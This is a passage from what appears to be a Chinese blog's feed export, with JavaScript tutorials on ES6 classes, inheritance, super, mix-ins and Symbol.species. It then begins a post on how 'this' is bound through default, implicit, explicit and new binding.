class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> makes a noise.`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(name); <span class="comment">// 调用超类构造函数并传入name参数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> barks.`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> Dog(<span class="string">&#x27;Mitzie&#x27;</span>);</span><br><span class="line">d.speak();<span class="comment">// &#x27;Mitzie barks.&#x27;</span></span><br></pre></td></tr></table></figure><p>如果子类中定义了构造函数，那么它必须先调用 <code>super()</code> 才能使用 <code>this</code> 。</p><p>也可以继承传统的基于函数的“类”：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Animal.prototype.speak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; makes a noise.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.speak();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; barks.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> Dog(<span class="string">&#x27;Mitzie&#x27;</span>);</span><br><span class="line">d.speak();<span class="comment">//Mitzie makes a noise.  Mitzie barks.</span></span><br></pre></td></tr></table></figure><p>请注意，类不能继承<strong>常规对象（不可构造的）</strong>。如果要继承常规对象，可以改用<code>Object.setPrototypeOf()</code>：</p><p><code>Object.setPrototypeOf(obj, proto);</code>直接修改已有对象的原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Animal = &#123;</span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; makes a noise.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(Dog.prototype, Animal);<span class="comment">// 如果不这样做，在调用speak时会返回TypeError</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> Dog(<span class="string">&#x27;Mitzie&#x27;</span>);</span><br><span class="line">d.speak(); <span class="comment">// Mitzie makes a noise.</span></span><br></pre></td></tr></table></figure><h2 id="使用-super-调用超类"><a href="#使用-super-调用超类" class="headerlink" title="使用 super 调用超类"></a>使用 <code>super</code> 调用超类</h2><p><code>super</code> 关键字用于<strong>调用对象的父对象上的方法。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; makes a noise.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">extends</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.speak();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; roars.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mix-ins-混入"><a href="#Mix-ins-混入" class="headerlink" title="Mix-ins / 混入"></a>Mix-ins / 混入</h2><p>抽象子类或者 mix-ins 是类的模板。 一个 ECMAScript 类只能有一个单超类，所以想要从工具类来多重继承的行为是不可能的。</p><p>子类继承的只能是父类提供的功能性。因此，例如，从工具类的多重继承是不可能的。该功能必须由超类提供。</p><p>一个以超类作为输入的函数和一个继承该超类的子类作为输出可以用于在ECMAScript中实现混合：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> calculatorMixin = <span class="function"><span class="params">Base</span> =&gt;</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">calc</span>(<span class="params"></span>)</span> &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomizerMixin = <span class="function"><span class="params">Base</span> =&gt;</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">randomize</span>(<span class="params"></span>)</span> &#123; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用 mix-ins 的类可以像下面这样写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> <span class="keyword">extends</span> <span class="title">calculatorMixin</span>(<span class="title">randomizerMixin</span>(<span class="title">Foo</span>)) </span>&#123; &#125;</span><br></pre></td></tr></table></figure><h2 id="Species"><a href="#Species" class="headerlink" title="Species"></a>Species</h2><p>你可能希望在派生数组类 <em><code>MyArray</code></em> 中返回 <code>Array</code>对象。这种 species 方式允许你<strong>覆盖默认的构造函数。</strong></p><p>例如，当使用像<code>map()</code>返回默认构造函数的方法时，您希望这些方法返回一个父<code>Array</code>对象，而不是<code>MyArray</code>对象。<code>Symbol.species</code>符号可以让你这样做：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Overwrite species to the parent Array constructor</span></span><br><span class="line">  <span class="keyword">static</span> get [<span class="built_in">Symbol</span>.species]() &#123; <span class="keyword">return</span> <span class="built_in">Array</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> MyArray(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> mapped = a.map(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(mapped <span class="keyword">instanceof</span> MyArray);</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(mapped <span class="keyword">instanceof</span> <span class="built_in">Array</span>);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Class-的基本语法&quot;&gt;&lt;a href=&quot;#Class-的基本语法&quot; class=&quot;headerlink&quot; title=&quot;Class 的基本语法&quot;&gt;&lt;/a&gt;Class 的基本语法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;类是用于创建对象的模板。他们用代码封装数据以处理该数</summary>
      
    
    
    
    <category term="ES6+" scheme="https://lesliewaong.top/categories/ES6/"/>
    
    
    <category term="Class" scheme="https://lesliewaong.top/tags/Class/"/>
    
    <category term="super" scheme="https://lesliewaong.top/tags/super/"/>
    
    <category term="extends" scheme="https://lesliewaong.top/tags/extends/"/>
    
  </entry>
  
  <entry>
    <title>this指向与箭头函数</title>
    <link href="https://lesliewaong.top/posts/90460439.html"/>
    <id>https://lesliewaong.top/posts/90460439.html</id>
    <published>2022-02-18T13:01:02.000Z</published>
    <updated>2022-03-25T14:08:26.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h1><blockquote><p>引言</p></blockquote><p>要理解<code>this</code>的设计，我们需要先了解<code>Javascript</code>中内存的数据结构；</p><p><code>Javascript</code>内置七种数据类型，可以分为<strong>基本数据类型</strong>和<strong>对象数据类型</strong>，在这里我们主要讲解一下<strong>对象数据类型</strong>在内存中的存储方式；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;Heternally&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure><p><code>Javascript</code>引擎在处理上面代码时，会在<strong>堆内存</strong>中，生成一个对象<code>&#123; name: &#39;Heternally&#39;&#125;</code>，然后把这个对象在内存中的地址赋值给变量<code>obj</code>。所以在读取<code>obj.name</code>时，需要先从变量<code>obj</code>拿到地址，然后再从对应地址中拿到对象，再返回它的<code>name</code>属性。</p><p>对象的属性可能是一个函数，当引擎遇到对象属性是函数的情况，会将函数单独保存在<strong>堆</strong>中，然后再将函数的地址赋值给对象属性；而<code>Javascript</code>是允许在函数体内引用当前环境的其他变量，那么问题来了，函数可以在不同的运行环境执行，所以我们就需要一种机制，能够在函数内获得当前运行环境，由此诞生了<code>this</code>，<strong>它的设计目的就是指向函数运行时所在的环境。</strong></p><blockquote><p>如何正确判定this指向</p></blockquote><p>总结了<code>this</code>的绑定规则总共是有下面5种：请记住一点：==谁调用这个函数或方法,this关键字就指向谁。==</p><ul><li>1、默认绑定（严格/非严格模式）</li><li>2、隐式绑定</li><li>3、显式绑定</li><li>4、new绑定</li><li>5、ES6箭头函数绑定</li></ul><h2 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h2><h3 id="全局上下文"><a href="#全局上下文" class="headerlink" title="全局上下文"></a>全局上下文</h3><p>无论是否在严格模式下，在全局执行环境中（在任何函数体外部）<code>this</code> 都指向全局对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在浏览器中, window 对象同时也是全局对象：</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">37</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a); <span class="comment">// 37</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.b = <span class="string">&quot;MDN&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.b)  <span class="comment">// &quot;MDN&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(b)         <span class="comment">// &quot;MDN&quot;</span></span><br></pre></td></tr></table></figure><p><strong>备注：</strong>你可以使用 <code>globalThis</code>获取全局对象，无论你的代码是否在当前上下文运行。</p><h3 id="函数上下文"><a href="#函数上下文" class="headerlink" title="函数上下文"></a>函数上下文</h3><p>函数内部，<code>this</code>的值取决于函数被调用的方式。</p><p>因为下面的代码不在严格模式下，且 <code>this</code> 的值不是由该调用设置的，所以 <code>this</code> 的值默认指向全局对象，浏览器中就是 <code>window</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在浏览器中：</span></span><br><span class="line">f1() === <span class="built_in">window</span>;   <span class="comment">//在浏览器中，全局对象是window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在Node中：</span></span><br><span class="line">f1() === globalThis;</span><br></pre></td></tr></table></figure><p>然而，在严格模式下，如果进入执行环境时没有设置 <code>this</code> 的值，<code>this</code> 会保持为 <code>undefined</code>，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">  &quot;use strict&quot;</span>; <span class="comment">// 这里是严格模式</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2() === <span class="literal">undefined</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="类上下文"><a href="#类上下文" class="headerlink" title="类上下文"></a>类上下文</h3><p><code>this</code> 在类中的表现与在函数中类似，因为类本质上也是函数，但也有一些区别和注意事项。</p><p>在类的构造函数中，<code>this</code> 是一个常规对象。类中所有非静态的方法都会被添加到 <code>this</code> 的原型中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> proto = <span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.getOwnPropertyNames(proto));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">first</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="title">second</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">third</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Example(); <span class="comment">// [&#x27;constructor&#x27;, &#x27;first&#x27;, &#x27;second&#x27;]</span></span><br></pre></td></tr></table></figure><p><strong>备注：</strong>静态方法不是 this 的属性，它们只是类自身的属性。</p><h3 id="派生类"><a href="#派生类" class="headerlink" title="派生类"></a>派生类</h3><p>不像基类的构造函数，派生类的构造函数没有初始的 <code>this</code> 绑定。在构造函数中调用 <code>super()</code>会生成一个 <code>this</code> 绑定，并相当于执行如下代码，Base为基类：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span> = <span class="keyword">new</span> Base();</span><br></pre></td></tr></table></figure><p><strong>警告：</strong>在调用 <code>super()</code> 之前引用 <code>this</code> 会抛出错误。</p><p>派生类不能在调用 <code>super()</code> 之前返回，除非其构造函数<strong>返回的是一个对象，或者根本没有构造函数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Good</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlsoGood</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">a</span>: <span class="number">5</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bad</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Good();</span><br><span class="line"><span class="keyword">new</span> AlsoGood();</span><br><span class="line"><span class="keyword">new</span> Bad(); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><h2 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h2><p>当函数作为对象的属性存在，通过<strong>对象属性执行函数</strong>时，此时隐式绑定规则会将<code>this</code>绑定到对象上；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;Heternally&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zl&#x27;</span>,</span><br><span class="line">  foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.foo(); <span class="comment">// zl</span></span><br></pre></td></tr></table></figure><p>注意上面代码中函数执行方式是通过<strong>对象属性</strong>执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;Heternally&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zl&#x27;</span>,</span><br><span class="line">  foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// Heternally</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo1 = obj.foo; </span><br><span class="line"></span><br><span class="line">foo1(); <span class="comment">// Heternally</span></span><br><span class="line"></span><br><span class="line">obj.foo(); <span class="comment">// zl</span></span><br></pre></td></tr></table></figure><p>由上面代码可以发现，通过<strong>赋值操作后执行函数</strong>，会应用默认绑定，此时在非严格模式下<code>this</code>会指向<strong>全局对象</strong>。</p><p>同样的，<strong>函数传参也是一种隐式赋值</strong>，此时在回调函数中会丢失<code>this</code>绑定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  fn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zl&#x27;</span>,</span><br><span class="line">  foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;Heternally&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Foo(obj.foo); <span class="comment">// Heternally</span></span><br><span class="line"><span class="comment">// 在Foo中相当于先执行了 var fn = obj.foo;</span></span><br></pre></td></tr></table></figure><h2 id="显式绑定"><a href="#显式绑定" class="headerlink" title="显式绑定"></a>显式绑定</h2><p><strong>通过 <code>call</code> <code>apply</code> <code>bind</code>绑定</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.a + <span class="built_in">this</span>.b + c + d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数是用作“this”的对象</span></span><br><span class="line"><span class="comment">// 其余参数用作函数的参数</span></span><br><span class="line">add.call(o, <span class="number">5</span>, <span class="number">7</span>); <span class="comment">// 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数是用作“this”的对象</span></span><br><span class="line"><span class="comment">// 第二个参数是一个数组，数组中的两个成员用作函数参数</span></span><br><span class="line">add.apply(o, [<span class="number">10</span>, <span class="number">20</span>]); <span class="comment">// 34</span></span><br></pre></td></tr></table></figure><p>在<strong>非严格模式下</strong>使用 <code>call</code> 和 <code>apply</code> 时，如果用作 <code>this</code> 的值不是对象，则会被尝试转换为对象。<code>null</code> 和 <code>undefined</code> 被转换为全局对象。原始值如 <code>7</code> 或 <code>&#39;foo&#39;</code> 会使用相应构造函数转换为对象。因此 <code>7</code> 会被转换为 <code>new Number(7)</code> 生成的对象，字符串 <code>&#39;foo&#39;</code> 会转换为 <code>new String(&#39;foo&#39;)</code> 生成的对象。<strong>严格模式下不会进行转换。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">this</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar.call(<span class="number">7</span>);     <span class="comment">// [object Number]</span></span><br><span class="line">bar.call(<span class="string">&#x27;foo&#x27;</span>); <span class="comment">// [object String]</span></span><br><span class="line">bar.call(<span class="literal">undefined</span>); <span class="comment">// [object global]</span></span><br></pre></td></tr></table></figure><p>ECMAScript 5 引入了 <code>Function.prototype.bind()</code>。调用<code>f.bind(someObject)</code>会创建一个与<code>f</code><strong>具有相同函数体和作用域的函数</strong>，但是在这个新函数中，<code>this</code>将永久地被绑定到了<code>bind</code>的第一个参数，<strong>无论这个函数是如何被调用的</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = f.bind(&#123;<span class="attr">a</span>:<span class="string">&quot;azerty&quot;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(g()); <span class="comment">// azerty</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h = g.bind(&#123;<span class="attr">a</span>:<span class="string">&#x27;yoo&#x27;</span>&#125;); <span class="comment">// bind只生效一次！</span></span><br><span class="line"><span class="built_in">console</span>.log(h()); <span class="comment">// azerty</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>:<span class="number">37</span>, <span class="attr">f</span>:f, <span class="attr">g</span>:g, <span class="attr">h</span>:h&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(o.a, o.f(), o.g(), o.h()); <span class="comment">// 37, 37, azerty, azerty</span></span><br></pre></td></tr></table></figure><h2 id="通过new绑定"><a href="#通过new绑定" class="headerlink" title="通过new绑定"></a>通过new绑定</h2><p>我们先看看构造函数在使用<code>new</code>后，执行了什么操作：</p><ul><li>它创建（构造）了一个全新的对象</li><li>它会被执行[[Prototype]]（也就是<code>__proto__</code>）链接</li><li>它使this指向新创建的对象</li><li>通过new创建的每个对象将最终被[[Prototype]]链接到这个函数的prototype对象上</li><li>如果函数没有返回对象类型Object(包含Functoin, Array, Date, RegExg, 